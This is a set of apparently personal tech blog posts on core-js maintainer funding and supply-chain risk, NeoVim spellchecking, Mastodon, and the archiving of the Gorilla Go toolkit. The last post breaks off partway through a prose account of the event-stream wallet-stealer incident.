[{"content":" SE7EN, 1995 - ‚ÄúThe Box‚Äù\nWeeks ago, Denis Pushkarev, the author of core-js, published ‚ÄúSo, what‚Äôs next?‚Äù, a long and lengthy stream of consciousness on the state of the project, it is something that I believe anyone and everyone who interacts with open source software should read. It chronicles an emotional tale of his passion project, distrust \u0026amp; hate for him, his seemingly selfless solitary quest for a better web, and a plea for financial assistance.\nThe post rightfully went viral and donations started flowing in.\nHowever, boiling just under the surface, much like any other large open source project with a solo developer, there are some real and scary implications to this entire situation.\nBut first, what is core-js?\nAfter all, the project is at the center of this discussion, so it‚Äôs worth understanding it deeply. Core-js is a JavaScript library that focuses on providing cutting edge web APIs, standardization, and ‚Äúpolyfills‚Äù. At the time of this writing, it has over 50 thousand dependent projects and some 40 million downloads weekly on NPM, a popular JavaScript module hosting service.\nIn short, it‚Äôs the JavaScript glue for web applications.\nIt enables modern JavaScript to work on an array of different browsers, including Internet Explorer. And it constantly tracks the latest web standards. This way, JavaScript developers can take advantage of the latest and greatest ECMAScript standards, ensuring interoperability of web pages and applications across different browser platforms. Things like collections, iterators, and promises can simply and easily be used through the core-js polyfills. All without having to re-invent the wheel and worry about broken builds across the many different browsers and JavaScript interpreters.\nLike any project that attempts to implement a ‚Äústandard‚Äù, this also means that it‚Äôs a ‚Äúliving‚Äù project; without constant update, which usually requires interplay with the upstream browsers and web-standard-setters, core-js would quickly fall apart. One small change in a web browser‚Äôs JavaScript interpreter without an update to core-js could mean a whole swath of web applications stop working and break.\nAnd for years, the project has existed in the depths of front-end dependencies, where Denis worked tirelessly. Many projects consumed core-js, usually not directly, but rather, somewhere in the nether of the NPM dependency hellscape. Its code, at least indirectly through dependency poisoning, is used almost everywhere. Massive multi-billion dollar companies like Apple, Amazon, Netflix, and many more have it embedded somewhere in their front-end dependency chains.\nTo say the least, it‚Äôs a really important project used by nearly every front-end.\nSo when did the trouble start? Around 2018, if you tried to NPM install core-js (or a project that depended on core-js), you would be greeted with the following message after the installation:\nThank you for using core-js for polyfilling JavaScript standard library! The project needs your help! Please consider supporting of core-js on Open Collective or Patreon ... Also, the author of core-js is looking for a good job While, admittedly, this was a fairly unconventional way to ask for support, it was a heartfelt attempt by the author to find financial means for a project he believed was worth all his time. Many in the JavaScript community did not respond well. So much so that ‚Äúthe author of some library is looking for a good job‚Äù sort of became a meme unto itself.\nAt this point, many in the JavaScript, front-end open source community should have looked a little closer and seen the potential disastrous future incoming; the author was in financial trouble (‚Äúthe project needs your help!‚Äù) and the author was taking extreme measures to find any financial support (by adding a very unconventional message embedded within a post-install script). But instead of responding accordingly by financially supporting the project, adding additional maintainers, forking the project, or moving it to a foundation, the broader JavaScript open source community instead turned to slander and hate; Denis received numerous distasteful comments in the core-js repository, via email, and everywhere else he had a presence online.\nIn 2019, as a response to a growing number of projects using the post-install-script as a way to raise funds and advertise their commercial product, NPM made the unilateral decision to ban post install console output that included ‚Äúads‚Äù. This impacted core-js and removed Denis‚Äôs plea for support.\nHis response:\nIf NPM will ban the postinstall message, it will be moved to browsers console. If NPM will ban core-js - it will cause problems for millions of users. I warned about it.\nAnd what was that warning?\nIf for some reason will be disabled ability to publish packages with this message - we will have one more left-pad-like problem, but much more serious. And after that 2 options - or core-js will not be maintained completely, or it will be maintained as a commercial-only project.\nYes, I am ready to kill it as a free open source project, if it will be required by the protection of my rights.\nThrough these warnings that attempted to appear genuine on the surface but really, were just thinly veiled threats, Denis was making it clear to anyone looking closely enough that he was more than ok nuking the project out of existence (or at least, hard pivoting it to a commercial product).\nBut what is left-pad? And what does it have to do with core-js anyways?\nLeft-pad was a very small JavaScript library authored by Azer Ko√ßulu. It was only 11 lines of code long and added additional white space to the beginning of a string (or in other words, it would \u0026ldquo;pad\u0026rdquo; the left side of a string).\nAnd much like core-js, it was also distributed through NPM (I‚Äôm seeing a common theme here ‚Ä¶). After a legal dispute with NPM over the name of Azer‚Äôs package ‚Äúkik‚Äù (a different side project which happened to also be the name of a popular messaging app), Azer removed all of his packages from NPM. Suddenly, in one fell swoop, across the world, JavaScript developers started seeing errors when building their projects:\nnpm ERR! 404 ‚Äòleft-pad‚Äô is not in the npm registry. Almost no one knew what the ‚Äúleft-pad‚Äù module was or what it did. And it didn‚Äôt even really matter. Somehow, through the swamp of NPM dependency chains, left-pad had become a project with 10s of millions of downloads a week and thousands of dependent projects. Azer effectively ‚Äúbroke the internet‚Äù by removing his packages that happened to be used across many other packages (and those packages used by other packages, so on and so forth).\nSome time latter, in emails that were widely published, Azer wrote:\nI want all my modules to be deleted including my account, along with this package. I don‚Äôt wanna be a part of NPM anymore. If you don‚Äôt do it, let me know how do it quickly.\nI think I have the right of deleting all my stuff from NPM.\nYes, it is well within the rights of a package owner to remove their packages from the NPM registry. They are, after all, just pieces of open source software, freely distributed with no contract to their working order; often a fact that corporate consumers of open source software forget.\nBy invoking the name of ‚Äúleft-pad‚Äù, Denis insinuates that he has considered following in Azer‚Äôs footsteps and doing the same. Although, the impact would likely be far greater.\nWhat about commercialization? Instead of completely obliterate the project, why not start selling licenses for it? Or somehow turn it into a product.\nI find this unlikely. If Denis, a Russian national, commercialized the library over night, it would essentially have the same effect as deleting it: core-js is used by thousands of large businesses around the world, and if they suddenly had a Russian corporate dependency (where there are currently many sanctions, including against ‚Äúadvanced technologies‚Äù), this would force drastic action to remove core-js from any and all front end dependencies. More likely than not, NPM themselves would remove the package if this hard pivot was made. If I had to guess, this is why Denis has not yet attempted to commercialize core-js; it would destroy a library he is passionate about without providing him the financial windfall he desires. A lose, lose situation.\nBut this is a sort of ‚ÄúTale of Two Cities‚Äù - despite the clear and present danger the project was in and regardless of veiled threats leveraged against the community by it‚Äôs sole maintainer, JavaScript developers disregarded this risk, big businesses consumed it as a deeply integrated dependency, and everyone increased their usage of the library, ignoring a potentially worsening situation.\nAnd, unfortunately, things did get worse.\nSometime in 2019-2020, Denis found himself in prison. And the core-js project went dark. Many found themselves asking ‚ÄúWhat happened?‚Äù, ‚ÄúWhat‚Äôs the state of this project?‚Äù, and ‚ÄúIs there any governance?‚Äù:\nThe JavaScript community should be a bit concerned because @zloirock looks like to be the \u0026ldquo;only\u0026rdquo; maintainer. Does somebody else have admin privileges to write on this repo? Publish on npm and make this project not to die?\nCompounding a risky situation, Denis had made himself the sole maintainer of the GitHub repository, despite frequent requests to donate the project to a foundation or to add others with administrative privileges. At the time, and still to this day, he had no interest in giving up authority over the project. This means that during the time of Denis‚Äôs absence, there were no changes. No security fixes. No new features. No commits to the main branch.\nThe project, for all intents and purposes, was dead.\nYet, still, the open source community and many multi-billion dollar companies did nothing. They didn‚Äôt attempt to mitigate the risk of using this critical, solo maintainer project and no alternatives emerged. Funny enough, at the time, the usage actually increased, by some estimates, to over 25 million downloads a week.\nIn the lifecycle of ‚Äúimportant‚Äù projects, once they die or their sole maintainer abandons them, usually a prominent fork emerges from within the community:\nBabel maintainer here üëã We are probably not going to fork core-js because we don\u0026rsquo;t have enough resources to maintain it.\nUnfortunately, despite many requests, one of the most qualified JavaScript organizations in the entire ecosystem, Babel, who had worked closely with Denis and core-js in the past, would not take the onerous of protecting their secure software supply-chain by forking core-js. Either because core-js was too complicated, they truly didn‚Äôt have allocations, or there was existing bad blood with the project, no useful alternative to core-js emerged.\nAnd unfortunately, at the point when a critical, solo-maintainer, open source project becomes so complex and so intertwined with the foundation of your product, you‚Äôve effectively \u0026ldquo;lost\u0026rdquo;. When it becomes impossible to fork, maintain, or contribute back to the upstream project, you‚Äôve effectively entered a deadlock hostage situation. Providing community support becomes impossible, yet, your software‚Äôs well-being is now directly linked to a solo maintainer who‚Äôs incentives are completely out of your control. One day on their own volition, they may up and abandon the project, leaving you the impossible task of picking up all the pieces.\nAt this point, major JavaScript organizations like NPM or the V8 engine team at Google should have recognized the problem, stepped in, forked the project into an organization with a community, and enabled people to start contributing back.\nBut Denis has never wanted to give up core-js to the community - he‚Äôs fought back on allowing others to have administrative privileges, he doesn‚Äôt enable others to make large meaningful contributions, and he won‚Äôt share the burden of shepherding an important project. He‚Äôs only ever seen two potential futures for core-js; make enough money (through donations or a job) to work on core-js full time or let it die. Any requests from Denis for outside contributions are general asks to report issues, improve testing, and write better documentation.\nIf I had to criticize Denis for something, it would be this deliberate decision to castrate his open source community. The overwhelming majority of the over 5,000 commits to the repository are exclusively from Denis, mostly committed directly to the main branch; no pull requests, no discussion, no feedback, just straight to the mainline. And a great open source leader should eventually evolve beyond making code contributions; they should be effectively delegating tasks to the community, grooming the backlog, discussing proposals with community members, creating safegaurds to ensure the safety \u0026amp; security of the software assets, and guiding the general direction of everything. Core-js never evolved past a simple pet project. Yet, to this day, the JavaScript ecosystem treats core-js like it‚Äôs a well maintained project with the support of an entire community. In reality, it‚Äôs one person with all the power making all the decisions and pushing all the changes.\nThis, finally, brings us to this week: Denis is out of prison. He appears to be in insurmountable debt to some Russian authority. And he publishes his call for financial assistance directly to the core-js README. It‚Äôs a harrowing story. A story that I believe it, fills me with sympathy but also scares me.\nDenis ends his writing with the following, quoted at length for brevity:\nThis was the last attempt to keep core-js as a free open-source project with a proper quality and functionality level. It was the last attempt to convey that there are real people on the other side of open-source with families to feed and problems to solve.\nIf you or your company use core-js in one way or another and are interested in the quality of your supply chain, support the project\nAgain, his final statement:\nIf your company uses core-js and are interested in the quality of your supply chain, support the project\nis not the crescendo of someone asking for help. This is, like before, a thinly veiled threat. And this time, it‚Äôs a threat against the security of the JavaScript supply chain at large.\nIf you know anything about me, you know that the secure software supply-chain is a topic I am deeply passionate about. I believe it is the most important technological hurdle of our modern area and I believe is at incredible risk. There are many avenues to disastrous supply chain attacks, but widely used projects that have solo maintainers are probably the largest and most blatant risk of them all. They‚Äôre sort of like unicorns, difficult to believe they‚Äôre real, but here we see one; a solo maintainer project that Amazon, Netflix, Apple, LinkedIn, PayPal, Binance, and tens of thousands of others have a dependency on.\nWorse yet, through Denis‚Äôs own words, we can now clearly see the massive financial trouble he is in:\nI received financial claims totaling about 80 thousand dollars at the exchange rate at that time from \u0026ldquo;victims\u0026rsquo;\u0026rdquo; relatives. A significant amount of money was also needed for a lawyer.\nAnd for a solo maintainer who has administrative, force push powers on a very complex, very popular software library, that few other people understand, his claims are a troubling reality. In the worst case, he could easily embed a malicious piece of code deep in the commit log and publish a new package to NPM for his financial gain. But more realistically, I worry for his safety; someone with crushing debt who presides over an incredibly valuable technological resource with little oversight is a prime target for state-sponsored hacker groups.\nIronically, to this day, many well respected security and supply-chain companies would call core-js ‚Äúhealthy‚Äù. Snyk, a developer security platform company, gives core-js a score of 94/100 noting it‚Äôs ‚ÄúPopularity‚Äù rating as a ‚ÄúKey Ecosystem Project‚Äù and its ‚ÄúMaintenance‚Äù rating as ‚ÄúHealthy‚Äù. I personally find this surprising given the years of solo maintainership of core-js, refusals by that sole maintainer to donate the project to a reputable organization, where that solo maintainer disappeared for well over a year, where threats of extinguishing the project were levied against the community, and where financial problems have been a reoccurring theme since the project\u0026rsquo;s conception.\nStill, potentially worse, are the thousands of massive companies that saw no problem freely commercializing Dnnis\u0026rsquo;s work despite the clear call for help. Again, this is a sort of \u0026ldquo;Tale of Two Cities\u0026rdquo;: Denis should be criticized for how he\u0026rsquo;s handled the open source community around his project but the software industry should be equally ashamed of how they\u0026rsquo;ve turned their back on this maintainer and their own software stability.\n‚ÄúThis all sounds bad. What do I do?‚Äù Here are my recommendations for consumers of core-js:\nMake a financial contribution - To start with, show Denis your support for the solo work he‚Äôs done on core-js and the incredible functionality he‚Äôs brought to the web. It\u0026rsquo;s the least we, as a software ecosystem, can do.\nPin your core-js dependency - While not a long term solution, pinning your dependency will keep you from consuming potentially malicious upstream changes that get made to new versions of core-js. Generally, it‚Äôs not a great idea to blindly take every new package or track ‚Äúlatest‚Äù. You should attempt to independently verify critical projects and packages you consume, pinning to the ones that pass your screening.\nCache versions of core-js you do rely on - In general, it is a mistake to blindly take dependencies from upstream package registries. In other words, you should never install an NPM package directly to your production environment. You may find yourself in a ‚Äúleft-pad‚Äù situation where a module owner one day decides to remove that package from the face of the earth. Or worse, where the package owner publishes a new malicious package under the same version that flows down to consumers. Those packages should, instead, be installed through a cache that you and your security team have independently created, validated, and control. Yes, this is another service you‚Äôd be running internally, but it‚Äôs well worth the cost in order to mitigate an entire class of supply chain attacks.\nRaise this concern with your CISO - Chief Information Security Officers are tasked with tracking, monitoring, and assessing the risk to all security vectors your company may be vulnerable to. It‚Äôs clear that Denis is in financial trouble. That, compounded with the fact that he has admin access to force push onto the main branch and unilaterally publish new packages, should be concerning. Work with your security team and CISO to determine the threat level of this risk and what impact it has on your code bases.\nGet involved with the project - I‚Äôve generally advocated for this in the past. And while core-js appears to be a difficult project to get involved with, there are still issues on GitHub you can raise, a few pull-requests to be commented on, and the commit log to be validated. If it‚Äôs a critical project to your company, spend the time, money, and engineering resources to protect your companies assets by getting involved.\nFind a reputable alternative and move to it - This is the best long term solution. But would require significant engineering resources.\nA quick note on making a financial contribution - by donating, you are not supporting a project. You are not providing funds to a well defined organization. And you are not entitled to technical support. You are simply bank-rolling an individual. An individual who has brought massively useful usability features to the web and JavaScript developers. Someone who needs help. Someone who, at will, on their own volition, may abandon the project, inject malicious commits deep into the commit log, or outright sell their GitHub account to nefarious third parties. And for a massively critical project like core-js, this is a terrifying solution to propose: ‚Äújust pay him and forget about it‚Äù won‚Äôt fix the problem in the long term and will never scale. If anything, it may exacerbate the problem by enabling a single, solo developer to keep working on a critical piece of web infrastructure by themselves. In that scenario, the bus factor is still 100%; Dnnis working on the project alone means that at any time, he could disappear again and leave the project to rot.\nIf you‚Äôve read this far, I hope you understand why I am worried for core-js‚Äôs future. And yet, I am also sympathetic to Denis‚Äôs plea. Commercialization of free and open software by large, multi-billion dollar companies has gone unchecked for decades. Denis worked tirelessly for years to provide what he believed to be a good solution to a massive problem on the web. And the ecosystem took advantage of that, using his project with little recognition. While I disagree with and criticize some of his decisions, in the end, it is his project, it‚Äôs just gotten out of control and is used everywhere. He has every right to do with it what he wants.\nBut that‚Äôs also the beauty of open source software. Denis could completely disappear tomorrow and there would be zero real world consequence to him doing that; most open source licenses indicate that the software is provided ‚Äúas is‚Äù with no support, no contract, and no assurance of its good working order.\nIt also means that anyone can fork the project and maintain it themselves. If there‚Äôs anyone to be ashamed of, it‚Äôs the JavaScript open source ecosystem that perpetuated an increasingly bad situation for too long.\nNow is the time to step up. Now is the time to support Denis. Now is the time to fork core-js. Now is the time to prevent another ‚Äúleft-pad-like problem‚Äù.\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/2023/03-12-revisiting-core-js/","summary":"SE7EN, 1995 - ‚ÄúThe Box‚Äù\nWeeks ago, Denis Pushkarev, the author of core-js, published ‚ÄúSo, what‚Äôs next?‚Äù, a long and lengthy stream of consciousness on the state of the project, it is something that I believe anyone and everyone who interacts with open source software should read. It chronicles an emotional tale of his passion project, distrust \u0026amp; hate for him, his seemingly selfless solitary quest for a better web, and a plea for financial assistance.","title":"Revisiting the Core-JS situation"},{"content":" I know.\nAny sane person\u0026rsquo;s editor already has spellchecking built in. And enabled by default. But I could never leave my beloved Neovim (and all the muscle memory I\u0026rsquo;ve built) just to spell things correctly! That\u0026rsquo;s why I became a programmer dammit! Who needs to know how to spell correctly when I can have single character variable names! Besides. We have tools. Isn\u0026rsquo;t that what computers are for!? Automate the boring stuff! (like spelling and grammar).\nThankfully, the long awaited spell integration features have landed in the NeoVim APIs. While spell has been around forever (or at least as long as Vim has been), only recently have the NeoVim Lua APIs been able to take advantage of it. Now, by default, without plugins, nvim can make spelling suggestions and treesitter can do the right things with misspellings in the syntax highlighting, code parsing, and search queries. Or in other words, spell is waaay nicer to use since it\u0026rsquo;ll ignore code (but not other stuff).\nThis has already greatly increased my productivity when writing. If you know anything about me (or have had the pleasure of working with me and seeing my egregious spelling mistakes), you know that I can not spell. My reliance on good spell checker tools has really evolved into a dependency. But no longer! Now, I can continue to convince myself that nvim is a superior editor because it finally has spell checking.\nIn all seriousness, shout out to the NeoVim community and maintainers for getting this feature in!! It\u0026rsquo;s already been a huge value add and saved me on several occasion from pushing an embarrassing commit message.\nEnabling it Make sure you have a new-ish version of NeoVim. I\u0026rsquo;m running with a newer nightly build, but the latest official release should do the trick.\n‚ùØ nvim --version NVIM v0.9.0-dev-699+gc752c8536 In your nvim configuration files, you\u0026rsquo;ll want to set the one of the following options:\nFor those who\u0026rsquo;ve ascended to using Lua: vim.opt.spelllang = \u0026#39;en_us\u0026#39; vim.opt.spell = true Or good, ol trusty Vimscript: set spelllang=en_us set spell Alternatively, you can use the command prompt to enable spell in your current session:\n:setlocal spell spelllang=en_us Note that en_us is US English. But there are tons of supported languages out of the box: en_gb for Great Britian English, de for German, ru for Russian, and more.\nNow, you should see words that are misspelled underlined! Nice!!\nUsing it There are 3 default key-mappings my workflow has revolved around for fixing spelling mistakes when I\u0026rsquo;m writing.\nFinding words: ]s will go to the next misspelled word.\n[s will go to the previous misspelled word.\nEasy as that! These default key-mappings are designed to be composable (or heck, modified in any way you like - this is NeoVim after all!) so spend some time thinking about what re-mappings, key bindings, or macros might make sense for you and your workflow.\nFixing words: When the cursor is under a word that is misspelled, z= will open the list of suggestions. Typically, the first suggestion is almost always right. Hit 1 and \u0026lt;enter\u0026gt; in the prompt to indicate you want to take the first suggestion. And the word has been fixed!\nThere\u0026rsquo;s also\n:spellr which is the \u0026ldquo;spell repeater\u0026rdquo;. It repeats the replacement done by z= for all matched misspellings in the current window. So, if there\u0026rsquo;s a word you frequently misspell, using :spellr is a quick and easy one stop shop for fixing all the misspellings of that type.\nAdding words to the spellfile If you\u0026rsquo;ve typed a word that doesn\u0026rsquo;t appear in the default dictionary, but is spelled correctly, you can easily add it yourself to the internal spell list. Especially in programming docs, there are lots of words not loaded into the default dictionary. With your cursor under the correctly spelled word that is underlined as misspelled, use the zg mapping to mark the word as a \u0026ldquo;good\u0026rdquo; word.\nDoing this, you\u0026rsquo;ll notice that NeoVim will automatically create a spell/ directory in the runtime path (typically under ~/.config/nvim). And in that directory, you\u0026rsquo;ll find two files:\n~/.config/nvim/ |-- spell | |-- en.utf-8.add | |-- en.utf-8.add.spl The .add file is a list of words you\u0026rsquo;ve added. For example, my .add file has tech words like \u0026ldquo;Kubernetes\u0026rdquo; which don\u0026rsquo;t typically appear in the default English dictionary.\nThe .spl file is a compiled binary \u0026ldquo;spellfile\u0026rdquo;. And it\u0026rsquo;s what is used to actually make suggestions and crawl the dictionary graph. Creating spellfiles is \u0026hellip; rather involved. But, for most people, simply using zg to mark \u0026ldquo;good\u0026rdquo; words gets you 99% of the way there.\nAs with most things NeoVim, there are excellent docs and APIs for using the spell interface: https://neovim.io/doc/user/spell.html Especially if you plan to generate your own spellfiles or programmatically modify text via the spell APIs, these doc resources are a must read!\nIf you found this blog post valuable, comment below, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors. Your support means the world to me!!\n","permalink":"https://johncodes.com/posts/2023/02-25-nvim-spell/","summary":"I know.\nAny sane person\u0026rsquo;s editor already has spellchecking built in. And enabled by default. But I could never leave my beloved Neovim (and all the muscle memory I\u0026rsquo;ve built) just to spell things correctly! That\u0026rsquo;s why I became a programmer dammit! Who needs to know how to spell correctly when I can have single character variable names! Besides. We have tools. Isn\u0026rsquo;t that what computers are for!? Automate the boring stuff!","title":"NeoVim: Using the spellchecker"},{"content":" \u0026ldquo;This is the social media network of a software engineer. Not as clumsy or random as Twitter; an elegant network for a more civilized age.\u0026rdquo; ‚Äï obi-wan kenobi\nOver the last week, I\u0026rsquo;ve abandoned my Twitter account in favor of diving head first into the world of Mastodon and the \u0026ldquo;Fediverse\u0026rdquo;. So far, it\u0026rsquo;s been a surprising, delightful, and enriching experience.\nBy the time I moved to Mastodon, I had some 3,000 followers on Twitter. But the platform has atrophied and changed in many sad ways. Long gone are the days of fun technical deep dives, inside scoops on your favorite projects, and starting conversations with your technical peers. Engagement (at least for me. Maybe I\u0026rsquo;m very boring?) is way down and the platform itself is breaking: I haven\u0026rsquo;t been able to reliably access my DMs for the better part of a week.\nInstead, tech Twitter has been left with an exorbitant amount of \u0026ldquo;influencers\u0026rdquo; saying things like: \u0026ldquo;As a developer, how many hours do you sleep\u0026rdquo;, \u0026ldquo;10 reasons Next.js is the best thing since sliced bread!\u0026rdquo;, and \u0026ldquo;How to get your first tech job in 6 months!\u0026rdquo;. All shameless attempts to groom the all seeing algorithm in their favor.\nFor me, the interesting conversations had stifled and it was time to try something else. Enter Mastodon; the blessed successor to many\u0026rsquo;s beloved Twitter of a forgotten era!\nMastodon is abit weird though.\nFor one, there\u0026rsquo;s no \u0026ldquo;algorithm\u0026rdquo;. It\u0026rsquo;s just a sequential timeline of stuff from people you follow. For some who grew up in the age of never ending, dopamine dumping, slot machine scrolling, this might take awhile to get used to. But what you\u0026rsquo;ll find instead is real conversation and the ability to engage with those people directly. I don\u0026rsquo;t miss the days of inflammatory content designed to artificially drive up engagement. I\u0026rsquo;m happy it\u0026rsquo;s been replaced in my social media life with a slower, more intentional feed.\nIn that same vein, you\u0026rsquo;ll also notice that Mastodon is not a centralized place where everyone gathers to share their hot takes. Instead, it\u0026rsquo;s \u0026ldquo;federated\u0026rdquo; which means there are many different Mastodon servers and services. You can then crawl these different server instances to connect with a distributed network; they\u0026rsquo;re all interlinked. So, if I have an account on \u0026ldquo;server A\u0026rdquo;, I can still search, follow, and see content from people on \u0026ldquo;server B\u0026rdquo;. All of my content and information lives on \u0026ldquo;server A\u0026rdquo;, but through the magic of the internet and graph theory, a massive number of Mastodon servers can come together to create the great \u0026ldquo;Fediverse\u0026rdquo;; independently hosted and maintained servers that can all communicate together.\nOr not.\nIt\u0026rsquo;s also completely plausible to have a small Mastodon instance that is cut off from the Fediverse where only people internal to that instance can interact with each-other. That\u0026rsquo;s the joy of open source technology that you have the power to own, modify, and dictate the direction of.\nTo get started, you\u0026rsquo;ll need to find a server that you want to join. I picked fosstodon.org since its main focus is supporting people in the open source community. Browsing the list of indexed servers is a great way to start and find a place that makes sense for you to call home.\nFinding your Twitter network When you first get started, it can be hard trying to find people, especially if you\u0026rsquo;re coming from a large network on Twitter.\nOne of the Fediverse\u0026rsquo;s biggest downfalls is a lack of an efficient and sensible search. Because there could be any number of different web publishing platforms linked into the broader Fediverse, there\u0026rsquo;s no good way to index, search, and serve all of that distributed content at once.\nThankfully, there are a few handy tools to make this transition easier! My favorite is Twitodon. You sign in with your Twitter, sign in with your Mastodon account, and it crawls your Twitter following to find people in your existing network who have a Mastodon account. Then, you can export a CSV of your network and import it directly into Mastodon! (Don\u0026rsquo;t forget to revoke Twitodon\u0026rsquo;s access to Twitter and Mastodon once your done. Thankfully, they provide the steps necessary to do that).\nUser experience The default Mastodon user interface and experience is not amazing. And who can blame them. Mastodon is a non-profit foundation building the open source platform and hosting some of the biggest instances for pennies on the dollar. They probably have more important things to worry about (like if they should support quote Toots).\nBut, because the Fediverse is a thriving space full of tinkerers and hackers, I have a few recommendations on taking your Mastodon experience to the next level:\nIvory Tweetbot was a favorite Twitter client for many people. Tapbots, the duo who created the iOS application, lovingly curated a delightful Twitter user experience. But suddenly, a few weeks ago at the beginning of January, Twitter shut down third party client access to the API. And in one fell swoop, Tweetbot was no more. Instead of sulking, Tapbots immediately got to work shipping their Mastodon iOS client, Ivory.\nAnd wow.\nBefore Ivory, Mastodon didn\u0026rsquo;t really \u0026ldquo;make sense\u0026rdquo; for me. Now, it\u0026rsquo;s everything I hoped for; a beautiful user interface, customizable buttons and actions, and notifications that actually work. Even in it\u0026rsquo;s very early access state, it\u0026rsquo;s still a massive accomplishment.\nFor an iOS client (sorry Android people), I couldn\u0026rsquo;t recommend Ivory enough.\nElk.zone So, what about a web client? Well, let me introduce to you Elk.zone, a web client from members of the core Vue.js team.\nAnd it\u0026rsquo;s really, really good. I would argue maybe even better than the Twitter web client user experience. It\u0026rsquo;s intuitive, it makes tons of sense, it has native lite and dark mode, etc. And I shouldn\u0026rsquo;t be surprised; anytime I come across a page built with Vue, I\u0026rsquo;m always impressed by the framework\u0026rsquo;s output.\nHuge shout out to this small team for accomplishing so much in such a short time!\nIn short, as Twitter falls apart, there is a lovely home for you somewhere in the Fediverse. It\u0026rsquo;s growing day by day. And with lots of people tinkering on the platform, it\u0026rsquo;s user experience, features, and possibilities will only continue to thrive from here. I can\u0026rsquo;t wait to see you there and start a conversation: https://fosstodon.org/@johnmcbride\nIf you found this blog post valuable, consider subscribing to future posts via RSS or buying me a coffee via GitHub sponsors.\n","permalink":"https://johncodes.com/posts/2023/01-28-the-joy-of-mastodon/","summary":"\u0026ldquo;This is the social media network of a software engineer. Not as clumsy or random as Twitter; an elegant network for a more civilized age.\u0026rdquo; ‚Äï obi-wan kenobi\nOver the last week, I\u0026rsquo;ve abandoned my Twitter account in favor of diving head first into the world of Mastodon and the \u0026ldquo;Fediverse\u0026rdquo;. So far, it\u0026rsquo;s been a surprising, delightful, and enriching experience.\nBy the time I moved to Mastodon, I had some 3,000 followers on Twitter.","title":"An elegant social media network for a more civilized age."},{"content":" The Matrix, 1999\nYears ago, entrepreneurs and innovators predicated that ‚Äúsoftware would eat the world‚Äù. And to little surprise, year after year, the world has become more and more reliant on software solutions. Often times, that software is (or indirectly depends on) some open source software, maintained by a group of people whose only affiliation to one another may be participation in that open source project‚Äôs community. But we‚Äôre in trouble. The security of open source software is under threat and we‚Äôre running out of people to reliably maintain those projects. And as our stacks get deeper, our dependencies become more interlinked, leading to terrifying compromises in the secure software supply-chain. For a perfect example of what‚Äôs happening in the open source world right now, we don‚Äôt need to look much further than the extremely popular Gorilla toolkit for Go.\nAs of this writing, in December of 2022, Gorilla has been archived, a project that provided powerful web framework technology like mux and sessions. Over its lengthy tenure, it was the de facto Go framework for web servers, routing requests, handling HTTP traffic, and using websockets. It was used by tens of thousands of other software packages and it came as a shock to most people in the Go community that the project would be no more; no longer maintained, no more releases, and no community support. But for anyone paying close enough attention, the signs of turmoil were clear: open calls for maintainers went unanswered, there were few active outside contributors, and the burden of maintainership was very heavy.\nThe Gorilla framework was one of those ‚Äúimportant dependencies‚Äù. It sat at the critical intersection of providing nice quality of life tools while still securely handling important payloads. Developers would mold their logic around the APIs provided by Gorilla and entire codebases would be shaped by the use of the framework. The community at large trusted Gorilla; the last thing you want in your server is a web framework riddled with bugs and CVEs. In the secure software supply-chain, much like Nginx and OpenSSL, it‚Äôs a project that was at the cornerstone of many other supply-chains and dependencies. If something went wrong in the Gorilla framework, it had the potential to impact millions of servers, services, and other projects.\nThe secure software supply-chain is one of those abstract concepts that giant tech companies, security firms, and news outlets all love to buzz wording about. It‚Äôs the ‚Äúidea‚Äù that the software you are consuming as a dependency, all the way through your stack, is exactly the software you‚Äôre expecting to consume. In other words, it‚Äôs the assurance that some hacker didn‚Äôt inject a backdoor into a library or build tool you use, compromising your entire product, software library, or even company. Supply-chain attacks are misgevious because they almost never go after the actual intended target. Instead, they compromise some dependency to then go after the intended target.\nThe classic example, still to this day, is the Solar Winds attack: some unnamed, Russian state-backed hacker group was able to compromise the internal Solar Winds build system, leaving any subsequent software built using that system injected with backdoors and exploits. The fallout from this attack was massive. Many government agencies, including the State Department, confirmed massive data breaches. The estimated cost of this attack continues to rise and is estimated to be in the billions of dollars.\nProduct after product have popped up in the last few years to try and solve these problems: software signing solutions, automated security scanning tools, up to date CVE databases, automated bots, AI assisted coding tools, etc. There was even a whole Whitehouse counsel on the subject. The federal government knows this is the most important (and most critically vulnerable) vector to the well being of our nation‚Äôs software infrastructure and they‚Äôve been taking direct action to fight these kind of attacks.\nBut the secure software supply-chain is also one of those things that falls apart quickly; without delicate handling and meticulous safeguarding, things go south fast. For months, the Gorilla toolkit had an open call for maintainers, seeking additional people to keep its codebases up to date, secure, and well maintained. But in the end, the Gorilla maintainers couldn‚Äôt find enough people to keep the project afloat. Many people volunteered but then were never seen again. And the bar for maintainer-ship was rightfully very high:\njust handing the reins of even a single software package that has north of 13k unique clones a week (mux) is just not something I‚Äôd ever be comfortable with. This has tended to play out poorly with other projects.\nAnd in the past, this has played out poorly in other projects:\nIn 2018, GitHub user FallingSnow opened the issue ‚ÄúI don‚Äôt know what to say.‚Äù in the popular, but somewhat unknown, NPM JavaScript package event-stream. He\u0026rsquo;d found something very peculiar in recent commits to the library. A new maintainer, not seen in the community before, with what appeared to be an entirely new GitHub account, had committed a strange piece of code directly to the main branch. This unknown new maintainer had also cut a new package to the NPM registry, forcing this change onto anyone tracking the latest packages in their project.\nThe changes looked like this: In a new file, a long inline encrypted string was added. The string would be decoded using some unknown environment variable, and then, that unencrypted string would be injected as a JavaScript module into the package, effectively executing whatever code was hidden behind the encrypted string. In short, unknown code was being deciphered, injected, and executed at runtime.\nThe GitHub issue went viral. And through sheer brute force, abit of luck, and hundreds of commenters, the community was able to decrypt the string, revealing the injected code‚Äôs purpose: a crypto-currency ‚Äúwallet stealer‚Äù. If the code detected a specific wallet on the system, it used a known exploit to steal all the crypto stored in that wallet.\nThis exploitative code lived in the event-stream NPM module for months. Going undetected by security scanners, consumers, and the project‚Äôs owner. Only when someone in the community who was curious enough to take a look did this obvious code-injection attack become clear. But what made this attack especially bad was that the event-stream module was used by many other modules (and those modules used by other modules, and so on). In theory, this potentially affected thousands of software packages and millions of end-users. Developers who had no idea their JavaScript used event-stream deep in their dependency stack were now suddenly having to quickly patch their code. How was this even possible? Who approved and allowed this to happen?\nThe owner of the GitHub repository, and original author of the code, said:\nhe emailed me and said he wanted to maintain the module, so I gave it to him. I don\u0026rsquo;t get any thing from maintaining this module, and I don\u0026rsquo;t even use it anymore, and havn\u0026rsquo;t for years.\nand\nnote: I no longer have publish rights to this module on npm.\nJust like that, just by asking, some bad actor was able to 